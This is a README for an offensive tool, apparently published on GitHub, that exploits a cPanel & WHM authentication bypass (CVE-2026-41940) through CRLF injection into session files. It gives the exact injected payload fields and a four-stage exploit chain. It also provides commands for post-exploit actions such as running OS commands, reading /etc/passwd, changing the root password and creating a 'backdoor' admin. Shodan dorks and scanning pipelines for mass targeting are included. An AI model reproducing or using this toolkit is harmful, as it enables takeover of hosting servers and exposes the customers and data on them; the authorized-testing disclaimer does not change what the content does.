# cPanelSniper

<p align="center">
  <img src="cPanel.jpg" alt="cPanelSniper" width="700"/>
</p>

<p align="center">
  <a href="https://www.python.org/"><img src="https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square&logo=python" alt="Python"></a>
  <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41940"><img src="https://img.shields.io/badge/CVE--2026--41940-CVSS%3A10.0-red?style=flat-square" alt="CVE"></a>
  <img src="https://img.shields.io/badge/cPanel%20%26%20WHM-Auth%20Bypass-critical?style=flat-square&color=red" alt="cPanel">
  <img src="https://img.shields.io/badge/stdlib%20only-no%20pip-green?style=flat-square" alt="stdlib">
  <img src="https://img.shields.io/badge/pipeline-ready-blue?style=flat-square" alt="pipeline">
  <a href="https://twitter.com/ynsmroztas"><img src="https://img.shields.io/badge/Author-@ynsmroztas-orange?style=flat-square&logo=twitter" alt="Author"></a>
</p>

<p align="center">
  <b>CVE-2026-41940 — cPanel & WHM Authentication Bypass via Session-File CRLF Injection</b><br>
  4-stage exploit chain · Interactive WHM Shell · Bulk scanner · Pipeline ready · stdlib only
</p>

---

## Overview

**cPanelSniper** is a focused exploitation framework for **CVE-2026-41940**, a critical authentication bypass vulnerability affecting cPanel & WHM. The vulnerability allows unauthenticated remote attackers to gain root-level WHM access by injecting CRLF sequences into the session file via the `Authorization` HTTP header — without any valid credentials.

- **CVSS Score:** 10.0 (Critical)
- **In-the-wild exploitation:** Confirmed (April 2026)
- **Affected installs:** ~70 million domains running cPanel & WHM
- **No dependencies:** Pure Python stdlib — no pip, no requests, no external packages

> **For authorized penetration testing and bug bounty programs only.**

---

## How It Works

The root cause lives in `Session.pm`: the `saveSession()` function calls `filter_sessiondata()` **after** writing the session file to disk. This means CRLF characters embedded in the `Authorization: Basic` header value are written verbatim into the session file, injecting attacker-controlled fields before sanitization occurs.

```
Normal flow:
  POST /login/ → filter_sessiondata() → write session → auth check

Vulnerable flow:
  POST /login/ → write session (CRLF payload injected) → filter_sessiondata() → auth check reads poisoned file
```

### The CRLF Payload

The `Authorization: Basic` value decodes to:

```
root:x
successful_internal_auth_with_timestamp=9999999999
user=root
tfa_verified=1
hasroot=1
```

These fields are written directly into the session file on disk. When read back, cPanel treats the session as a fully authenticated root session.

### 4-Stage Exploit Chain

```
┌─────────────────────────────────────────────────────────────┐
│  Stage 0 — Canonical Hostname Discovery                     │
│  GET /openid_connect/cpanelid → 307 → real hostname         │
├─────────────────────────────────────────────────────────────┤
│  Stage 1 — Mint Preauth Session                             │
│  POST /login/?login_only=1  (wrong creds)                   │
│  ← 401 + whostmgrsession cookie                             │
├─────────────────────────────────────────────────────────────┤
│  Stage 2 — CRLF Injection                                   │
│  GET / + Cookie: session + Authorization: Basic <payload>   │
│  cpsrvd writes CRLF fields into session file                │
│  ← 307 Location: /cpsessXXXXXXXXXX/...                     │
├─────────────────────────────────────────────────────────────┤
│  Stage 3 — Propagate (do_token_denied gadget)               │
│  GET /scripts2/listaccts                                    │
│  Triggers raw→cache flush — injected fields become active   │
│  ← 401 Token denied (expected)                              │
├─────────────────────────────────────────────────────────────┤
│  Stage 4 — Verify WHM Root Access                           │
│  GET /cpsessXXXXXXXXXX/json-api/version                     │
│  ← 200 {"version":"11.x.x.x","result":1}  = PWNED          │
└─────────────────────────────────────────────────────────────┘
```

---

## Affected Versions

| Branch | Vulnerable | Patched |
|--------|-----------|---------|
| 110.x | ≤ 11.110.0.96 | **11.110.0.97** |
| 118.x | ≤ 11.118.0.62 | **11.118.0.63** |
| 126.x | ≤ 11.126.0.53 | **11.126.0.54** |
| 132.x | ≤ 11.132.0.28 | **11.132.0.29** |
| 134.x | ≤ 11.134.0.19 | **11.134.0.20** |
| 136.x | ≤ 11.136.0.4  | **11.136.0.5**  |

---

## Installation

```bash
git clone https://github.com/ynsmroztas/cPanelSniper
cd cPanelSniper
python3 cPanelSniper.py --help
```

No pip install required. Pure Python 3.8+ stdlib only.

---

## Usage

### Basic Scan

```bash
# Single target — scan only
python3 cPanelSniper.py -u https://target.com:2087

# Single target — interactive shell after bypass
python3 cPanelSniper.py -u https://target.com:2087 --action shell

# Bulk scan from file
python3 cPanelSniper.py -l targets.txt -t 20 -o results.json

# Force scan (skip cPanel detection)
python3 cPanelSniper.py -u https://target.com:2087 --force
```

### Post-Exploit Actions

```bash
# List all cPanel accounts on the server
python3 cPanelSniper.py -u https://target.com:2087 --action list

# Execute OS command
python3 cPanelSniper.py -u https://target.com:2087 --action cmd --cmd "id;whoami;uname -a"
python3 cPanelSniper.py -u https://target.com:2087 --action cmd --cmd "ls /home"
python3 cPanelSniper.py -u https://target.com:2087 --action cmd --cmd "cat /etc/passwd"

# Get server info (hostname, load, disk, MySQL host)
python3 cPanelSniper.py -u https://target.com:2087 --action info

# Get cPanel version
python3 cPanelSniper.py -u https://target.com:2087 --action version

# Change root password
python3 cPanelSniper.py -u https://target.com:2087 --action passwd --passwd 'NewPass@2026!'

# Interactive WHM shell
python3 cPanelSniper.py -u https://target.com:2087 --action shell
```

### Pipelines

```bash
# subfinder → httpx → cPanelSniper
subfinder -d target.com -silent | \
  httpx -silent -ports 2087,2086 -threads 50 | \
  python3 cPanelSniper.py -t 30 -o results.json

# From scope list
cat scope.txt | \
  httpx -silent -ports 2087,2086 -threads 100 | \
  python3 cPanelSniper.py -t 30 -o results.json

# Shodan results
shodan search --fields ip_str,port 'title:"WHM Login"' | \
  awk '{print "https://"$1":"$2}' | \
  python3 cPanelSniper.py -t 30 -o shodan_results.json

# stdin pipe
echo "https://target.com:2087" | python3 cPanelSniper.py

# Multiple sources combined
{ subfinder -d target.com -silent; cat extra.txt; } | \
  httpx -silent -ports 2087 | \
  python3 cPanelSniper.py -t 20 --action list
```

---

## Interactive WHM Shell

After a successful bypass, the `--action shell` flag drops into an interactive prompt:

```
════════════════════════════════════════════════════════════
  WHM Shell — target.com
  Version: CVE-2026-41940 | Auth: CRLF bypass
  Type 'help' for commands, 'exit' to quit
════════════════════════════════════════════════════════════

mitsec@target.com ▶ id
  uid=0(root) gid=0(root) groups=0(root)

mitsec@target.com ▶ accounts
  [cPanel Accounts]  target.com:2087 (47 users)
    user01               domain: example.com    email: admin@example.com
    user02               domain: shop.com       email: info@shop.com
    ...

mitsec@target.com ▶ cat /etc/passwd
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ...

mitsec@target.com ▶ info
  [Server Info]  https://target.com:2087
  hostname: srv01.target.com
  load: 0.72 / 0.66 / 0.69
  version: 11.130.0.6

mitsec@target.com ▶ addadmin mitsec P@ss2026!
  [BACKDOOR ADMIN CREATED]
  Target   : https://target.com:2087
  Username : mitsec
  Password : P@ss2026!
  Profile  : super_admin

mitsec@target.com ▶ exit
```

### Shell Commands

| Command | Description |
|---------|-------------|
| `id` / `whoami` | Show UID and hostname |
| `hostname` | Get server hostname |
| `version` | cPanel version info |
| `info` | Load, disk, MySQL host, version |
| `accounts` | List all cPanel user accounts |
| `cat <path>` | Read file content |
| `ls [path]` | List directory |
| `exec <cmd>` | Execute OS command |
| `addadmin <user> <pass>` | Create backdoor WHM admin |
| `passwd <pass>` | Change root password |
| `api <endpoint> [k=v ...]` | Raw WHM JSON API call |
| `help` | Show all commands |
| `exit` | Exit shell |

---

## CLI Reference

```
usage: cPanelSniper.py [-h] [-u URL] [-l LIST] [--hostname HOSTNAME]
                       [-t THREADS] [--timeout TIMEOUT] [--rate-limit N]
                       [--action ACTION] [--passwd PASS] [--cmd CMD]
                       [--new-user USER] [--new-domain DOMAIN]
                       [-o OUTPUT] [--no-color]

Target:
  -u, --url URL          Single target URL (e.g. https://host:2087)
  -l, --list LIST        File with URLs (one per line)
  --hostname HOSTNAME    Override canonical Host header (auto-discovered)

Scan:
  -t, --threads N        Concurrent threads (default: 10)
  --timeout N            Request timeout seconds (default: 15)
  --rate-limit N         Delay between targets (default: 0)
  --force                Skip cPanel detection check

Post-Exploit:
  --action ACTION        Action: list | passwd | cmd | exec | info |
                                 version | shell | adduser
  --passwd PASS          New root password (--action passwd)
  --cmd CMD              OS command (--action cmd/exec)
  --new-user USER        New cPanel username (--action adduser)
  --new-domain DOMAIN    New cPanel domain (--action adduser)

Output:
  -o, --output FILE      Save results to JSON file
  --no-color             Disable ANSI colors
```

---

## Shodan Dorks

```
title:"WHM Login"
title:"WebHost Manager" port:2087
product:"cPanel" port:2087
http.title:"cPanel" port:2083
ssl.cert.subject.cn:"cPanel" port:2087
```

---

## Output Example

```
   ██████╗██████╗  █████╗ ███╗  ██╗███████╗██╗
  ██╔════╝██╔══██╗██╔══██╗████╗ ██║██╔════╝██║
  ...

  CVE-2026-41940 — cPanel & WHM Auth Bypass via CRLF Injection
  4-stage: preauth → CRLF inject → propagate → verify → post-exploit
  In-The-Wild | CVSS 10.0 | By Mitsec (@ynsmroztas)

  Configuration:
   Targets  : 1
   Threads  : 10
   Timeout  : 15s
   Action   : list

14:46:22 [SCAN] Starting 4-stage exploit chain... https://target.com:2087
14:46:23 [INFO] Canonical hostname discovered: srv01.target.com
14:46:23 [STEP] Stage 1/4 — Minting preauth session...
14:46:23 [  OK] Stage1: preauth session = :QFB4o8XENBqlr6U1...
14:46:23 [STEP] Stage 2/4 — CRLF injection via Authorization header...
14:46:24 [  OK] Stage2: HTTP 307 → token=/cpsess8493537756
14:46:24 [STEP] Stage 3/4 — Firing do_token_denied gadget (raw→cache)...
14:46:25 [  OK] Stage3: HTTP 401 — do_token_denied gadget fired
14:46:25 [STEP] Stage 4/4 — Verifying WHM root access...
14:46:26 [PWND] CVE-2026-41940 CONFIRMED — WHM root access!
14:46:26 [PWND]   Token    : /cpsess8493537756
14:46:26 [PWND]   Version  : 11.130.0.6
14:46:26 [PWND]   API URL  : https://target.com:2087/cpsess8493537756/json-api/version
14:46:26 [ API] Running post-exploit action: list
14:46:27 [ API] listaccts → HTTP 200

  [cPanel Accounts]  target.com:2087 (47 accounts)
    client01    domain: client01.com    email: admin@client01.com
    client02    domain: client02.net    email: info@client02.net
    ...

══════════════════════════════════════════════════════════════════════
  cPanelSniper — Scan Complete
  Time: 5.8s  ·  Targets: 1

  ⚡ 1 VULNERABLE TARGET(S)

  Target   : https://target.com:2087
  Version  : 11.130.0.6
  Token    : /cpsess8493537756
  API URL  : https://target.com:2087/cpsess8493537756/json-api/version
══════════════════════════════════════════════════════════════════════
```

---

## Technical Details

### Session File Injection

The injected `Authorization: Basic` value (base64-decoded) contains CRLF sequences that become newlines in the cPanel session file:

```
root:x\r\n
successful_internal_auth_with_timestamp=9999999999\r\n
user=root\r\n
tfa_verified=1\r\n
hasroot=1
```

cPanel's session reader parses these as legitimate session fields, granting full root WHM access.

### Stage 3 — The do_token_denied Gadget

The critical and often-overlooked step: after the CRLF injection (Stage 2), the poisoned session data exists only in the **raw session file**. A request to `/scripts2/listaccts` triggers the internal `do_token_denied` handler, which flushes the raw session data into the session **cache**. Without this flush, Stage 4 would return a 403.

### Session Token Extraction

```
Set-Cookie: whostmgrsession=%3aSESSION_NAME%2cOB_HEX; ...
                              ^              ^
                              |              +-- ob hash (stripped)
                              +-- session name (used for injection)
```

The session name (before `%2C`) is extracted and used as the cookie value for subsequent requests.

---

## References

- [watchTowr Labs — CVE-2026-41940 Technical Analysis](https://labs.watchtowr.com/the-internet-is-falling-down-falling-down-falling-down-cpanel-whm-authentication-bypass-cve-2026-41940/)
- [cPanel Security Advisory](https://support.cpanel.net/hc/en-us/articles/40073787579671-cPanel-WHM-Security-Update-04-28-2026)
- [NVD — CVE-2026-41940](https://nvd.nist.gov/vuln/detail/CVE-2026-41940)
- [Hadrian Blog — CVE-2026-41940 Analysis](https://hadrian.io/blog/cve-2026-41940-a-critical-authentication-bypass-in-cpanel)
- [Nuclei Template — CVE-2026-41940](https://cloud.projectdiscovery.io/library/CVE-2026-41940)

---

## Disclaimer

> This tool is intended for **authorized security testing** and **bug bounty programs only**. Unauthorized access to computer systems is illegal. The author assumes no liability and is not responsible for any misuse or damage caused by this tool. Always obtain proper written authorization before testing.

---

## Author

**Mitsec** — [@ynsmroztas](https://twitter.com/ynsmroztas)

- 🏆 Top Hacker — Intigriti
- 🐛 2,430+ vulnerabilities disclosed
- 💀 1,100+ P1 Critical findings
- 🏅 100+ Hall of Fame recognitions

---

<p align="center">
  Made with ❤️ by <a href="https://twitter.com/ynsmroztas">@ynsmroztas</a>
</p>
